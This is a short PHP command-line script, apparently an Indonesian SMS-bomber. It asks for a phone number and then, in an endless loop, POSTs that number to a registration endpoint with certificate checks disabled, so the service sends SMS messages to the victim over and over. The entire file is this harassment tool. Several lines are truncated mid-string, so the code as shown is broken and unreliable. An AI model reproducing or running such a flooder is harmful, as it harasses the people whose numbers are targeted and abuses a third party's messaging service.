<?php
$banner = "======================================>
function sms($target) {
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, "https://registra>
  curl_setopt($ch, CURLOPT_POST, true);
  curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$t>
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.>
  $result = curl_exec($ch);
  curl_close($ch);
  $json = json_decode($result, true);
  sleep(0.3);
  echo "\nBerhasil", $json["success"], "Mengirim >
}
echo $banner;
echo "masukan nomor:";
$nomor = trim(fgets(STDIN));
while (true) {
  $execute = sms($nomor);
  print $execute;
}
?>
